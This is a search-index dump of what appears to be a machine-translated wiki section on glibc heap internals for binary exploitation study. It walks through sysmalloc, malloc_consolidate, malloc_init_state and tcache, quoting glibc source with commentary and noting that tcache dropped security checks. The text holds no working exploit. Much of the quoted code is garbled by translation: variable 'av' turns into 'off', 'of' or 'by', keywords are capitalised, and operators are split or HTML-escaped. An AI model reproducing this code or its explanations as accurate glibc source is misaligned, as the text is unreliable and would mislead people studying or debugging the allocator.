MMAP_THRESHOLD_MAX and _MIN are the bounds on the dynamically adjusted MMAP_THRESHOLD. */ #ifndef DEFAULT_MMAP_THRESHOLD_MIN #define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024) #endif #ifndef DEFAULT_MMAP_THRESHOLD_MAX /* For 32-bit platforms we cannot increase the maximum mmap threshold much because it is also the minimum value for the maximum heap size and its alignment. Going above 512k (i.e., 1M for new heaps) wastes too much address space. */ #if __WORDSIZE == 32 #define DEFAULT_MMAP_THRESHOLD_MAX (512 * 1024) #else #define DEFAULT_MMAP_THRESHOLD_MAX (4 * 1024 * 1024 * sizeof(long)) #endif #endif The following is part of the code, which is not the focus of our concern at present, and can be skipped temporarily. /* If have mmap, and the request size meets the mmap threshold, and the system supports mmap, and there are few enough currently allocated mmapped regions, try to directly map this request rather than expanding top. */ if ( av == NULL || (( unsigned long )( nb ) >= ( unsigned long )( mp_ . mmap_threshold ) && ( mp_ . n_mmaps < mp_ . n_mmaps_max )) { char * mm ; /* return value from mmap call*/ try_mmap : /* Round up size to nearest page. For mmapped chunks, the overhead is one SIZE_SZ unit larger than for normal chunks, because there is no following chunk whose prev_size field could be used. See the front_misalign handling below, for glibc there is no need for further alignments unless we have have high alignment. */ if ( MALLOC_ALIGNMENT == 2 * SIZE_SZ ) size = ALIGN_UP ( nb + SIZE_SZ , pagesize ); else size = ALIGN_UP ( nb + SIZE_SZ + MALLOC_ALIGN_MASK , pagesize ); tried_mmap = true ; /* Don't try if size wraps around 0 */ if (( unsigned long )( size ) > ( unsigned long )( nb )) { mm = ( char * )( MMAP ( 0 , size , PROT_READ | PROT_WRITE , 0 )); if ( mm != MAP_FAILED ) { /* The offset to the start of the mmapped region is stored in the prev_size field of the chunk. This allows us to adjust returned start address to meet alignment requirements here and in memalign(), and still be able to compute proper address argument for later munmap in free() and realloc(). */ if ( MALLOC_ALIGNMENT == 2 * SIZE_SZ ) { /* For glibc, chunk2mem increases the address by 2*SIZE_SZ and MALLOC_ALIGN_MASK is 2*SIZE_SZ-1. Each mmap'ed area is page aligned and therefore definitely MALLOC_ALIGN_MASK-aligned. */ assert ((( INTERNAL_SIZE_T ) chunk2mem ( mm ) & MALLOC_ALIGN_MASK ) == 0 ); front_misalign = 0 ; } else front_misalign = ( INTERNAL_SIZE_T ) chunk2mem ( mm ) & MALLOC_ALIGN_MASK ; if ( front_misalign > 0 ) { correction = MALLOC_ALIGNMENT - front_misalign ; p = ( mchunkptr )( mm + correction ); set_prev_size ( p , correction ); set_head ( p , ( size - correction ) | IS_MMAPPED ); } else { p = ( mchunkptr ) mm ; set_prev_size ( p , 0 ); set_head ( p , size | IS_MMAPPED ); } /* update statistics */ int new = atomic_exchange_and_add ( & mp_ . n_mmaps , 1 ) + 1 ; atomic_max ( & mp_ . max_n_mmaps , new ); unsigned long sum ; sum = atomic_exchange_and_add ( & mp_ . mmapped_mem , size ) + size ; atomic_max ( & mp_ . max_mmapped_mem , sum ); check_chunk ( av , p ); return chunk2mem ( p ); } } }","title":"Consider mmap"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#mmap-failed-or-unallocated-heap","text":"/* There are no usable arenas and mmap also failed. */ if ( av == NULL ) return 0 ; If it is any of these two situations, you can actually quit. .","title":"mmap failed or unallocated heap"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#recording-old-heap-information","text":"/* Record incoming configuration of top */ old_top = av -> top ; old_size = chunksize ( old_top ); old_end = ( char * )( chunk_at_offset ( old_top , old_size )); brk = snd_brk = ( char * )( MORECORE_FAILURE );","title":"Recording old heap information"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#check-old-heap-information-1","text":"/* If not the first time through, we require old_size to be at least MINSIZE and to have prev_inuse set. */ assert (( old_top == initial_top ( av ) && old_size == 0 ) || (( unsigned long )( old_size ) >= MINSIZE && prev_inuse ( old_top ) && (( unsigned long ) old_end & ( pagesize - 1 )) == 0 )); This check requires that any one of the conditions be met old_top == initial_top(av) && old_size == 0 , ie if it is the first time, the heap size needs to be 0. The new heap, then (unsigned long)(old_size) >= MINSIZE && prev_inuse(old_top) , the heap size should be no smaller than MINSIZE , and the previous heap block should be in use. ((unsigned long)old_end &(pagesize - 1)) == 0) , the end address of the heap should be page-aligned. Since the page alignment size defaults to 0x1000, the lower 12 bits need to be 0.","title":"Check old heap information 1"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#check-old-heap-information-2","text":"/* Precondition: not enough current space to satisfy nb request */ assert (( unsigned long )( old_size ) < ( unsigned long )( nb + MINSIZE )); According to the definition in malloc static void * _int_malloc ( mstate av , size_t bytes ) { INTERNAL_SIZE_T nb ; /* normalized request size */ nb should be the byte that has been added to the chunk header. Why add MINSIZE ? This is because the size of the top chunk should at least reserve the MINSIZE space for easy merging.","title":"Check old heap information 2"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#non-main_arena","text":"This is not the focus of care for the time being, and it will not be analyzed for the time being. if ( av ! = & main_arena ) { heap_info * old_heap , * heap ; size_t old_heap_size ; /* First try to extend the current heap. */ old_heap = heap_for_ptr ( old_top ); old_heap_size = old_heap -> size ; if (( long )( MINSIZE + nb - old_size ) > 0 && grow_heap ( old_heap , MINSIZE + nb - old_size ) == 0 ) { av -> system_mem += old_heap -> size - old_heap_size ; set_head ( old_top , ((( char * ) old_heap + old_heap -> size ) - ( char * ) old_top ) | PREV_INUSE ); } else if (( heap = new_heap ( nb + ( MINSIZE + sizeof ( * heap )), mp_ . top_pad ))) { /* Use a newly allocated heap. */ heap -> ar_ptr = av ; heap -> prev = old_heap ; av -> system_mem + = heap -> size ; /* Set up the new top. */ top ( av ) = chunk_at_offset ( heap , sizeof ( * heap )); set_head ( top ( av ), ( heap -> size - sizeof ( * heap )) | PREV_INUSE ); /* Setup fencepost and free the old top chunk with a multiple of MALLOC_ALIGNMENT in size. */ /* The fencepost takes at least MINSIZE bytes, because it might become the top chunk again later. Note that a footer is set up, too, although the chunk is marked in use. */ old_size = ( old_size - MINSIZE ) & ~ MALLOC_ALIGN_MASK ; set_head ( chunk_at_offset ( old_top , old_size + 2 * SIZE_SZ ), 0 | PREV_INUSE ); if ( old_size >= MINSIZE ) { set_head ( chunk_at_offset ( old_top , old_size ), ( 2 * SIZE_SZ ) | PREV_INUSE ); set_foot ( chunk_at_offset ( old_top , old_size ), ( 2 * SIZE_SZ )); set_head ( old_top , old_size | PREV_INUSE | NON_MAIN_ARENA ); _int_free ( av , old_top , 1 ); } else { set_head ( old_top , ( old_size + 2 * SIZE_SZ ) | PREV_INUSE ); set_foot ( old_top , ( old_size + 2 * SIZE_SZ )); } } else if ( ! tried_mmap ) /* We can at least try to use to mmap memory. */ goto try_mmap ; }","title":"Non main_arena"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#main_arena-processing","text":"","title":"Main_arena Processing"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#calculating-memory","text":"The calculation can satisfy the requested memory size. else { / * by == main_arena * / /* Request enough space for nb + pad + overhead */ size = nb + mp_ . top_pad + MINSIZE ; By default top_pad is defined as #ifndef DEFAULT_TOP_PAD # define DEFAULT_TOP_PAD 131072 #endif That is, 131072 bytes, 0x20000 bytes.","title":"Calculating memory"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#whether-it-is-continuous","text":"If we want the heap space to be continuous, then we can actually reuse the previous memory. /* If contiguous, we can subtract out existing space that we hope to combine with new space. We add it back later only if we don't actually get contiguous space. */ if ( contiguous ( av )) size -= old_size ;","title":"Whether it is continuous"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#align-page-size","text":"/* Round to a multiple of page size. If MORECORE is not contiguous, this ensures that we only call it with whole-page arguments. And if MORECORE is contiguous and this is not first time through, this preserves page-alignment of previous calls. Otherwise, we correct to page-align below. */ size = ALIGN_UP ( size , pagesize );","title":"Align page size"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#applying-for-memory","text":"/* Don't try to call MORECORE if argument is so big as to appear negative. Note that since mmap takes size_t arg, it may succeed below even if we cannot call MORECORE. */ if ( size > 0 ) { brk = ( char * )( MORECORE ( size )); LIBC_PROBE ( memory_sbrk_more , 2 , brk , size ); }","title":"Applying for memory"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#may-succeed","text":"if ( brk != ( char * )( MORECORE_FAILURE )) { /* Call the `morecore' hook if necessary. */ void ( * hook )( void ) = atomic_forced_read ( __after_morecore_hook ); if ( __builtin_expect ( hook != NULL , 0 )) ( * hook )(); } It is a bit of a meaning to call a hook here.","title":"May succeed"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#failed","text":"Failure, consider mmap. else { /* If have mmap, try using it as a backup when MORECORE fails or cannot be used. This is worth doing on systems that have \"holes\" in address space, so sbrk cannot extend to give contiguous space, but space is available elsewhere. Note that we ignore mmap max count and threshold limits, since the space will not be used as a segregated mmap region. */ /* Cannot merge with old top, so add its size back in */ if ( contiguous ( av )) size = ALIGN_UP ( size + old_size , pagesize ); /* If we are relying on mmap as backup, then use larger units */ if (( unsigned long )( size ) < ( unsigned long )( MMAP_AS_MORECORE_SIZE )) size = MMAP_AS_MORECORE_SIZE ; /* Don't try if size wraps around 0 */ if (( unsigned long )( size ) > ( unsigned long )( nb )) { char * mbrk = ( char * )( MMAP ( 0 , size , PROT_READ | PROT_WRITE , 0 )); if ( mbrk != MAP_FAILED ) { /* We do not need, and cannot use, another sbrk call to find end */ brk = mbrk ; snd_brk = brk + size ; /* Record that we no longer have a contiguous sbrk region. After the first time mmap is used as backup, we do not ever rely on contiguous space since this could incorrectly bridge regions. */ set_noncontiguous ( av ); } } }","title":"Failed"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#memory-may-be-applied-successfully","text":"if ( brk != ( char * )( MORECORE_FAILURE )) { if ( mp_ . sbrk_base == 0 ) mp_srk_base = brk ; av -> system_mem + = size ;","title":"Memory may be applied successfully"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#situation-1","text":"/* If MORECORE extends previous space, we can likewise extend top size. */ if ( brk == old_end && snd_brk == ( char * )( MORECORE_FAILURE )) set_head ( old_top , ( size + old_size ) | PREV_INUSE );","title":"Situation 1"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#case-2-unexpected-memory-exhaustion","text":"else if ( contiguous ( av ) && old_size && brk < old_end ) /* Oops! Someone else killed our space.. Can't touch anything. */ malloc_printerr ( \"break adjusted to free malloc space\" );","title":"Case 2 - Unexpected memory exhaustion"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#handling-other-unexpected-situations","text":"/* Otherwise, make adjustments: * If the first time through or noncontiguous, we need to call sbrk just to find out where the end of memory lies. * We need to ensure that all returned chunks from malloc will meet MALLOC_ALIGNMENT * If there was an intervening foreign sbrk, we need to adjust sbrk request size to account for fact that we will not be able to combine new space with existing space in old_top. * Almost all systems internally allocate whole pages at a time, in which case we might as well use the whole last page of request. So we allocate enough more memory to hit a page boundary now, which in turn causes future contiguous calls to page-align. */ else { front_misalign = 0 ; end_misalign = 0 ; correction = 0 ; aligned_brk = brk ;","title":"Handling other unexpected situations"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#processing-contiguous-memory","text":"/* handle contiguous cases */ if ( contiguous ( av )) { /* Count foreign sbrk as system_mem. */ if ( old_size ) av -> system_mem + = brk - old_end ; /* Guarantee alignment of first new chunk made from this space */ front_misalign = ( INTERNAL_SIZE_T ) chunk2mem ( brk ) & MALLOC_ALIGN_MASK ; if ( front_misalign > 0 ) { /* Skip over some bytes to arrive at an aligned position. We don't need to specially mark these wasted front bytes. They will never be accessed anyway because prev_inuse of av->top (and any chunk created from its start) is always true after initialization. */ correction = MALLOC_ALIGNMENT - front_misalign ; aligned_brk += correction ; } /* If this isn't adjacent to existing space, then we will not be able to merge with old_top space, so must add to 2nd request. */ correction += old_size ; /* Extend the end address to hit a page boundary */ end_misalign = ( INTERNAL_SIZE_T )( brk + size + correction ); correction += ( ALIGN_UP ( end_misalign , pagesize )) - end_misalign ; assert ( correction >= 0 ); snd_brk = ( char * )( MORECORE ( correction )); /* If can't allocate correction, try to at least find out current brk. It might be enough to proceed without failing. Note that if second sbrk did NOT fail, we assume that space is contiguous with first sbrk. This is a safe assumption unless program is multithreaded but doesn't use locks and a foreign sbrk occurred between our first and second calls. */ if ( snd_brk == ( char * )( MORECORE_FAILURE )) { correction = 0 ; snd_brk = ( char * ) ( MORECORE ( 0 )); } else { /* Call the `morecore' hook if necessary. */ void ( * hook )( void ) = atomic_forced_read ( __after_morecore_hook ); if ( __builtin_expect ( hook != NULL , 0 )) ( * hook )(); } }","title":"Processing contiguous memory"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#handling-discontinuous-memory","text":"/* handle non-contiguous cases */ else { if ( MALLOC_ALIGNMENT == 2 * SIZE_SZ ) /* MORECORE/mmap must correctly align */ assert ((( unsigned long ) chunk2mem ( brk ) & MALLOC_ALIGN_MASK ) == 0 ); else { front_misalign = ( INTERNAL_SIZE_T ) chunk2mem ( brk ) & MALLOC_ALIGN_MASK ; if ( front_misalign > 0 ) { /* Skip over some bytes to arrive at an aligned position. We don't need to specially mark these wasted front bytes. They will never be accessed anyway because prev_inuse of av->top (and any chunk created from its start) is always true after initialization. */ aligned_brk += MALLOC_ALIGNMENT - front_misalign ; } } /* Find out current end of memory */ if ( snd_brk == ( char * )( MORECORE_FAILURE )) { snd_brk = ( char * ) ( MORECORE ( 0 )); } }","title":"Handling discontinuous memory"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#adjustment","text":"/* Adjust top based on results of second sbrk */ if ( snd_brk != ( char * )( MORECORE_FAILURE )) { av -> top = ( mchunkptr ) aligned_brk ; set_head ( av -> top , ( snd_brk - aligned_brk + correction ) | PREV_INUSE ); av -> system_mem + = correction ; /* If not the first time through, we either have a gap due to foreign sbrk or a non-contiguous region. Insert a double fencepost at old_top to prevent consolidation with space we don't own. These fenceposts are artificial chunks that are marked as inuse and are in any case too small to use. We need two to make sizes and alignments work out. */ if ( old_size != 0 ) { /* Shrink old_top to insert fenceposts, keeping size a multiple of MALLOC_ALIGNMENT. We know there is at least enough space in old_top to do this. */ old_size = ( old_size - 4 * SIZE_SZ ) & ~ MALLOC_ALIGN_MASK ; set_head ( old_top , old_size | PREV_INUSE ); /* Note that the following assignments completely overwrite old_top when old_size was previously MINSIZE. This is intentional. We need the fencepost, even if old_top otherwise gets lost. */ set_head ( chunk_at_offset ( old_top , old_size ), ( 2 * SIZE_SZ ) | PREV_INUSE ); set_head ( chunk_at_offset ( old_top , old_size + 2 * SIZE_SZ ), ( 2 * SIZE_SZ ) | PREV_INUSE ); /* If possible, release the rest. */ if ( old_size >= MINSIZE ) { _int_free ( av , old_top , 1 ); } } } } It should be noted that here the program releases the old top chunk, and it will enter different bins or tcaches depending on the size.","title":"Adjustment"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#update-maximum-memory","text":"if (( unsigned long ) av -> system_mem > ( unsigned long ) ( av -> max_system_mem )) av -> max_system_mem = av -> system_mem ; check_malloc_state ( av );","title":"Update maximum memory"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#allocating-memory-blocks","text":"","title":"Allocating memory blocks"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#get-the-size","text":"/* finally, do the allocation */ p = av -> top ; size = chunksize ( p );","title":"Get the size"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#top","text":"/* check that one of the above allocation paths succeeded */ if (( unsigned long )( size ) >= ( unsigned long )( nb + MINSIZE )) { remainder_size = size - nb ; remainder = chunk_at_offset ( p , nb ); av -> top = remainder ; set_head ( p , nb | PREV_INUSE | ( av != & main_arena ? NON_MAIN_ARENA : 0 )); set_head ( remainder , remainder_size | PREV_INUSE ); check_malloced_chunk ( av , p , nb ); return chunk2mem ( p ); }","title":"\u5207\u5206 top"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#capture-all-errors","text":"/* catch all failure paths */ __set_errno ( ENOMEM ); return 0 ;","title":"Capture all errors"},{"location":"pwn/linux/glibc-heap/implementation/malloc_state/","text":"malloc_state Related Functions \u00b6 malloc_init_state \u00b6 /* Initialize a malloc_state struct. This is called only from within malloc_consolidate, which needs be called in the same contexts anyway. It is never called directly outside of malloc_consolidate because some optimizing compilers try to inline it at all call points, which turns out not to be an optimization at all. (Inlining it in malloc_consolidate is fine though.) */ static void malloc_init_state ( mstate av ) { int i ; mbinptr bin ; /* Establish circular links for normal bins */ for ( i = 1 ; i < NBINS ; ++ i ) { bin = bin_at ( av , i ); bin -& gt ; fd = bin -& gt ; bk = bin ; } #if MORECORE_CONTIGUOUS if ( by ! = & amp ; main_arena ) #endif set_noncontiguous ( of ); if ( av == & main_arena ) set_max_fast ( DEFAULT_MXFAST ); / / Set the flags flag does not currently have fast chunk off -& gt ; flags | = FASTCHUNKS_BIT ; // is unsorted bin off -& gt ; top = initial_top ( off ); } malloc_consolidate \u00b6 This function has two main functions. If fastbin is not initialized, ie global_max_fast is 0, initialize malloc_state. If it has already been initialized, merge the chunks in fastbin. The basic process is as follows Initial \u00b6 static void malloc_consolidate ( mstate av ) { mfastbinptr * fb ; /* current fastbin being consolidated */ mfastbinptr * maxfb ; /* last fastbin (for loop control) */ mchunkptr p ; /* current chunk being consolidated */ mchunkptr nextp ; /* next chunk to consolidate */ mchunkptr unsorted_bin ; /* bin header */ mchunkptr first_unsorted ; /* chunk to link to */ /* These have same use as in free() */ mchunkptr nextchunk ; INTERNAL_SIZE_T size ; INTERNAL_SIZE_T nextsize ; INTERNAL_SIZE_T prevsize ; int nextinuse ; mchunkptr bck ; mchunkptr fwd ; Merge chunk \u00b6 /* If max_fast is 0, we know that av hasn't yet been initialized, in which case do so below */ // Description fastbin has been initialized if ( get_max_fast () != 0 ) { // empty the fastbin tag // Because I want to merge the chunks in fastbin. clear_fastchunks ( of ); // unsorted_bin = unsorted_chunks ( off ); /* Remove each chunk from fast bin and consolidate it, placing it then in unsorted bin. Among other reasons for doing this, placing in unsorted bin avoids needing to calculate actual bins until malloc is sure that chunks aren't immediately going to be reused anyway. */ // Traverse each bin of fastbin in fd order, merging each chunk in the bin. maxfb = & amp ; fastbin ( off , NFASTBINS - 1 ); fb = & amp ; fastbin ( av , 0 ); do { p = atomic_exchange_acq ( fb , NULL ); if ( p != 0 ) { do { check_inuse_chunk ( av , p ); nextp = p -> fd ; /* Slightly streamlined version of consolidation code in * free() */ size = chunksize ( p ); nextchunk = chunk_at_offset ( p , size ); nextsize = chunksize ( nextchunk ); if ( ! prev_inuse ( p )) { prevsize = prev_size ( p ); size += prevsize ; p = chunk_at_offset ( p , - (( long ) prevsize )); unlink ( off , p , bck , fwd ); } if ( nextchunk != av -> top ) { // Determine if nextchunk is free. nextinuse = inuse_bit_at_offset ( nextchunk , nextsize ); if ( ! nextinuse ) { size += nextsize ; unlink ( av , nextchunk , bck , fwd ); } else // Set the prev inuse of nextchunk to 0 to indicate that the current fast chunk can be merged. clear_inuse_bit_at_offset ( nextchunk , 0 ); first_unsorted = unsorted_bin -> fd ; unsorted_bin -> fd = p ; first_unsorted -> bk = p ; if ( ! in_smallbin_range ( size )) { p -> fd_nextsize = NULL ; p -> bk_nextsize = NULL ; } set_head ( p , size | PREV_INUSE ); p -> bk = unsorted_bin ; p -> fd = first_unsorted ; set_foot ( p , size ); } else { size += nextsize ; set_head ( p , size | PREV_INUSE ); of -& gt ; top = p ; } } while (( p = nextp ) != 0 ); } } while ( fb ++ != maxfb ); Initialization \u00b6 Note that fastbin has not been initialized yet. } else { malloc_init_state ( of ); // It&#39;s useless in non-debug situations. In the case of debugging, do some testing. check_malloc_state ( of ); }","title":"malloc_state"},{"location":"pwn/linux/glibc-heap/implementation/malloc_state/#malloc_state-related-functions","text":"","title":"malloc_state Related Functions"},{"location":"pwn/linux/glibc-heap/implementation/malloc_state/#malloc_init_state","text":"/* Initialize a malloc_state struct. This is called only from within malloc_consolidate, which needs be called in the same contexts anyway. It is never called directly outside of malloc_consolidate because some optimizing compilers try to inline it at all call points, which turns out not to be an optimization at all. (Inlining it in malloc_consolidate is fine though.) */ static void malloc_init_state ( mstate av ) { int i ; mbinptr bin ; /* Establish circular links for normal bins */ for ( i = 1 ; i < NBINS ; ++ i ) { bin = bin_at ( av , i ); bin -& gt ; fd = bin -& gt ; bk = bin ; } #if MORECORE_CONTIGUOUS if ( by ! = & amp ; main_arena ) #endif set_noncontiguous ( of ); if ( av == & main_arena ) set_max_fast ( DEFAULT_MXFAST ); / / Set the flags flag does not currently have fast chunk off -& gt ; flags | = FASTCHUNKS_BIT ; // is unsorted bin off -& gt ; top = initial_top ( off ); }","title":"malloc_init_state"},{"location":"pwn/linux/glibc-heap/implementation/malloc_state/#malloc_consolidate","text":"This function has two main functions. If fastbin is not initialized, ie global_max_fast is 0, initialize malloc_state. If it has already been initialized, merge the chunks in fastbin. The basic process is as follows","title":"malloc_consolidate"},{"location":"pwn/linux/glibc-heap/implementation/malloc_state/#initial","text":"static void malloc_consolidate ( mstate av ) { mfastbinptr * fb ; /* current fastbin being consolidated */ mfastbinptr * maxfb ; /* last fastbin (for loop control) */ mchunkptr p ; /* current chunk being consolidated */ mchunkptr nextp ; /* next chunk to consolidate */ mchunkptr unsorted_bin ; /* bin header */ mchunkptr first_unsorted ; /* chunk to link to */ /* These have same use as in free() */ mchunkptr nextchunk ; INTERNAL_SIZE_T size ; INTERNAL_SIZE_T nextsize ; INTERNAL_SIZE_T prevsize ; int nextinuse ; mchunkptr bck ; mchunkptr fwd ;","title":"Initial"},{"location":"pwn/linux/glibc-heap/implementation/malloc_state/#merge-chunk","text":"/* If max_fast is 0, we know that av hasn't yet been initialized, in which case do so below */ // Description fastbin has been initialized if ( get_max_fast () != 0 ) { // empty the fastbin tag // Because I want to merge the chunks in fastbin. clear_fastchunks ( of ); // unsorted_bin = unsorted_chunks ( off ); /* Remove each chunk from fast bin and consolidate it, placing it then in unsorted bin. Among other reasons for doing this, placing in unsorted bin avoids needing to calculate actual bins until malloc is sure that chunks aren't immediately going to be reused anyway. */ // Traverse each bin of fastbin in fd order, merging each chunk in the bin. maxfb = & amp ; fastbin ( off , NFASTBINS - 1 ); fb = & amp ; fastbin ( av , 0 ); do { p = atomic_exchange_acq ( fb , NULL ); if ( p != 0 ) { do { check_inuse_chunk ( av , p ); nextp = p -> fd ; /* Slightly streamlined version of consolidation code in * free() */ size = chunksize ( p ); nextchunk = chunk_at_offset ( p , size ); nextsize = chunksize ( nextchunk ); if ( ! prev_inuse ( p )) { prevsize = prev_size ( p ); size += prevsize ; p = chunk_at_offset ( p , - (( long ) prevsize )); unlink ( off , p , bck , fwd ); } if ( nextchunk != av -> top ) { // Determine if nextchunk is free. nextinuse = inuse_bit_at_offset ( nextchunk , nextsize ); if ( ! nextinuse ) { size += nextsize ; unlink ( av , nextchunk , bck , fwd ); } else // Set the prev inuse of nextchunk to 0 to indicate that the current fast chunk can be merged. clear_inuse_bit_at_offset ( nextchunk , 0 ); first_unsorted = unsorted_bin -> fd ; unsorted_bin -> fd = p ; first_unsorted -> bk = p ; if ( ! in_smallbin_range ( size )) { p -> fd_nextsize = NULL ; p -> bk_nextsize = NULL ; } set_head ( p , size | PREV_INUSE ); p -> bk = unsorted_bin ; p -> fd = first_unsorted ; set_foot ( p , size ); } else { size += nextsize ; set_head ( p , size | PREV_INUSE ); of -& gt ; top = p ; } } while (( p = nextp ) != 0 ); } } while ( fb ++ != maxfb );","title":"Merge chunk"},{"location":"pwn/linux/glibc-heap/implementation/malloc_state/#initialization","text":"Note that fastbin has not been initialized yet. } else { malloc_init_state ( of ); // It&#39;s useless in non-debug situations. In the case of debugging, do some testing. check_malloc_state ( of ); }","title":"Initialization"},{"location":"pwn/linux/glibc-heap/implementation/misc/","text":"\u6d4b\u8bd5\u652f\u6301 \u00b6 The following code is used to support testing. Perturb_byte is 0 by default. static int perturb_byte ; static void alloc_perturb ( char * p , size_t n ) { if ( __glibc_unlikely ( perturb_byte )) memset ( p , perturb_byte ^ 0xff , n ); } static void free_perturb ( char * p , size_t n ) { if ( __glibc_unlikely ( perturb_byte )) memset ( p , perturb_byte , n ); }","title":"Other"},{"location":"pwn/linux/glibc-heap/implementation/misc/#_1","text":"The following code is used to support testing. Perturb_byte is 0 by default. static int perturb_byte ; static void alloc_perturb ( char * p , size_t n ) { if ( __glibc_unlikely ( perturb_byte )) memset ( p , perturb_byte ^ 0xff , n ); } static void free_perturb ( char * p , size_t n ) { if ( __glibc_unlikely ( perturb_byte )) memset ( p , perturb_byte , n ); }","title":"\u6d4b\u8bd5\u652f\u6301"},{"location":"pwn/linux/glibc-heap/implementation/overview/","text":"Deep understanding of heap implementation \u00b6 Think about it carefully, any heap implementation needs to consider the corresponding problem from the following two perspectives. Macro perspective Create a heap heap initialization Delete heap Micro angle Apply for a memory block Free memory block Of course, these are relatively high-level ideas, and the underlying implementation of different heaps will be different.","title":"Implementation"},{"location":"pwn/linux/glibc-heap/implementation/overview/#deep-understanding-of-heap-implementation","text":"Think about it carefully, any heap implementation needs to consider the corresponding problem from the following two perspectives. Macro perspective Create a heap heap initialization Delete heap Micro angle Apply for a memory block Free memory block Of course, these are relatively high-level ideas, and the underlying implementation of different heaps will be different.","title":"Deep understanding of heap implementation"},{"location":"pwn/linux/glibc-heap/implementation/tcache/","text":"tcache \u00b6 Tcache is a technique introduced after glibc 2.26 (ubuntu 17.10) (see commit ), the purpose is to improve The performance of heap management. But while improving performance, it has abandoned a lot of security checks, so there are many new ways to use it. > Mainly refer to the glibc source code, angelboy's slide and tukan.farm, the links are all at the end. Related Structure \u00b6 Tcache introduces two new structures, tcache_entry and tcache_perthread_struct . This is actually very similar to fastbin, but it is different. tcache_entry \u00b6 source code /* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache. */ typedef struct tcache_entry { struct tcache_entry * next ; } tcache_entry ; tcache_entry is used to link free chunk structures, where the next pointer points to the next chunk of the same size. Note that the next here points to the user data of the chunk, and the fd of the fastbin points to the address at the beginning of the chunk. Moreover, tcache_entry multiplexes the user data portion of the free chunk. tcache_perthread_struct \u00b6 source code /* There is one of these for each thread, which contains the per-thread cache (hence \"tcache_perthread_struct\"). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */ typedef struct tcache_perthread_struct { char counts [ TCACHE_MAX_BINS ]; tcache_entry * entries [ TCACHE_MAX_BINS ]; } tcache_perthread_struct ; # define TCACHE_MAX_BINS 64 static __thread tcache_perthread_struct * tcache = NULL ; Each thread maintains a tcache_prethread_struct , which is the management structure of the entire tcache. There are a total of TCACHE_MAX_BINS counters and a TCACHE_MAX_BINS entry tcache_entry. tcache_entry links the same size of free (after free) chunks in a singly linked list, much like fastbin. counts records the number of free chunks in the tcache_entry chain, with up to 7 chunks per chain. The diagram is probably: Basic working methods \u00b6 The first malloc will first malloc a block of memory for tcache_prethread_struct . free memory, and size is less than small bin size tcache will be placed in fastbin or unsorted bin before after tcache: Put it in the corresponding tcache until tcache is filled (the default is 7) After tcache is filled, the free memory is placed in fastbin or unsorted bin as before. chunks in tcache are not merged (do not cancel inuse bit) malloc memory, and size is in the tcache range First take chunk from tcache until tcache is empty After tcache is empty, look for it from bin When tcache is empty, if there is a chunk with size matching in fastbin/smallbin/unsorted bin , the chunk in fastbin/smallbin/unsorted bin will be put into tcache first until it is full. Then take it from tcache; therefore the order of chunks in bin and tcache will be reversed. Source Analysis \u00b6 Next, analyze tcache from the perspective of source code. __libc_malloc \u00b6 The first time malloc will enter MAYBE_INIT_TCACHE () source code void * __libc_malloc ( size_t bytes ) { ...... ...... #if USE_TCACHE /* int_free also calls request2size, be careful to not pad twice. */ size_t tbytes ; / / Calculate the actual size of the chunk according to the parameters passed in malloc , and calculate the subscript corresponding to tcache checked_request2size ( bytes , tbytes ); size_t tc_idx = csize2tidx ( tbytes ); / / Initialize tcache MAYBE_INIT_TCACHE (); DIAG_PUSH_NEEDS_COMMENT ; If ( tc_idx & lt ; mp_ . tcache_bins // The idx obtained from size is within the legal range /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */ && tcache && tcache -> entries [ tc_idx ] != NULL ) // tcache->entries[tc_idx] \u6709 chunk { return tcache_get ( tc_idx ); } DIAG_POP_NEEDS_COMMENT ; #endif ...... ...... } __tcache_init () \u00b6 Where MAYBE_INIT_TCACHE () calls tcache_init() when tcache is empty (that is, the first malloc), and directly looks at tcache_init() source code tcache_init ( void ) { mstate ar_ptr ; void * victim = 0 ; const size_t bytes = sizeof ( tcache_perthread_struct ); if ( tcache_shutting_down ) return ; Arena_get ( ar_ptr , bytes ); // find available arena Victim = _int_malloc ( ar_ptr , bytes ); // Request a chunk of sizeof(tcache_prethread_struct) size if (!victim && ar_ptr != NULL) { ar_ptr = arena_get_retry ( ar_ptr , bytes ); victim = _int_malloc ( ar_ptr , bytes ); } if ( ar_ptr != NULL ) __libc_lock_unlock ( ar_ptr -> mutex ); /* In a low memory situation, we may not be able to allocate memory - in which case, we just keep trying later. However, we typically do this very early, so either there is sufficient memory, or there isn't enough memory to do non-trivial allocations anyway. */ If ( victim ) // initialize tcache { tcache = ( tcache_perthread_struct * ) victim ; memset ( tcache , 0 , sizeof ( tcache_perthread_struct )); } } tcache_init() After successful return, tcache_prethread_struct was successfully created. Applying for memory \u00b6 Next, you will enter the steps to apply for memory. // Get memory from tcache list If ( tc_idx & lt ; mp_ . tcache_bins // idx calculated by size is within legal range /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */ && tcache & amp ; & amp ; tcache -& gt ; entries [ tc_idx ] != NULL ) // The tcache chain is not empty { return tcache_get ( tc_idx ); } DIAG_POP_NEEDS_COMMENT ; #endif // Enter a process similar to when 